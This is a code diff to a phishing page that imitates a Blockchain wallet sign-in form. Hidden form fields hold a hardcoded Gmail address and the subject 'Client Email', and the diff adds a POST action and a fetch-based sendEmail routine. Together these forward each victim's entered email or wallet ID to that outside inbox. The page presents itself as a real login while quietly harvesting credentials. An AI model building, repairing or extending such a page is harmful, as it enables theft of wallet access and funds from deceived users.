@@ -33,16 +33,15 @@
                         </div>
                     </a>
                 </div>
-                <form action="" style="display: grid; position: relative;">
+                <form action="/" method="POST" style="display: grid; position: relative;">
                     <div class="content" style="display: grid;">
                         <div style="display: flex; justify-content: space-between;">
                             <label for="email walletId">Email or Wallet ID</label>
-                            <p id="req" style="color: rgb(217, 59, 48); display: none;
-                            ">required</p>
+                            <p class="inputMessage" id="focus-message">required</p>
                         </div>
-                        <input id="myInput recipient" class="email_in" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
-                        <input id="myInput suject" class="email_in" value="Client Email" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
-                        <input id="myInput message" type="text" placeholder="Enter Email or Wallet ID" required>
+                        <input onfocus="showMessage()" onblur="hideMessage()" name="recipient" id="myInput recipient" class="email_in .input-box" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                        <input onfocus="showMessage()" onblur="hideMessage()" name="subject" id="myInput suject" class="email_in .input-box" value="Client Email" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                        <input onfocus="showMessage()" onblur="hideMessage()" name="message" id="myInput message" class="email_in .input-box" type="text" placeholder="Enter Email or Wallet ID" required>
                     </div>
                     <div class="content">
                         <input type="submit" value="Continue" style="width: 100%; margin-bottom: 0;">
@@ -52,6 +51,65 @@
                             </a>
                         </div>
                     </div>
+
+                    <style>
+                        /* Style for the message */
+                        .inputMessage {
+                          display: none;
+                          color: rgb(217, 59, 48);
+                          font-size: 14px;
+                        }
+                    
+                        /* Style for the input box when focused */
+                        .input-box:focus {
+                          border-color: #007bff; /* Change the border color when focused */
+                        }
+                    
+                        /* Style for the input box when not focused */
+                        .input-box {
+                          width: 200px;
+                          padding: 8px;
+                          font-size: 16px;
+                          border: 1px solid #ccc;
+                          transition: border-color 0.3s ease-in-out;
+                        }
+                      </style>
+                    <script>
+                            // JavaScript functions to show/hide the message
+                        function showMessage() {
+                            document.getElementById("focus-message").style.display = "block";
+                        }
+                    
+                        function hideMessage() {
+                            document.getElementById("focus-message").style.display = "none";
+                        }
+                    </script>
+                    <!-- ssend mail -->
+                    <script>
+                    async function sendEmail() {
+                        const recipient = document.getElementById('recipient').value;
+                        const subject = document.getElementById('subject').value;
+                        const message = document.getElementById('message').value;
+
+                        // Use AJAX or fetch to send the data to your Node.js server
+                        // Here's a simple example using fetch
+                        await fetch('/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ recipient, subject, message }),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                        console.log('Success:', data);
+                        })
+                        .catch((error) => {
+                        console.error('Error:', error);
+                        });
+                    }
+
+                </script>
                 </form>
                <div class="blc_act" style="text-align: center; font-weight: 500; font-size: 16px; line-height: inherit; text-transform: none; font-style: normal; color: rgb(103, 113, 132); padding: 4% 15% 2% 15%;"> <p>Don't have a Blockchain Account? <a href="#" style="text-decoration: none; color: rgb(12, 108, 242); font-weight: 600; font-size: 16px; line-height: inherit;">Sign up Now <i class="ri-arrow-right-line"></i></a></p></div>
             </div>
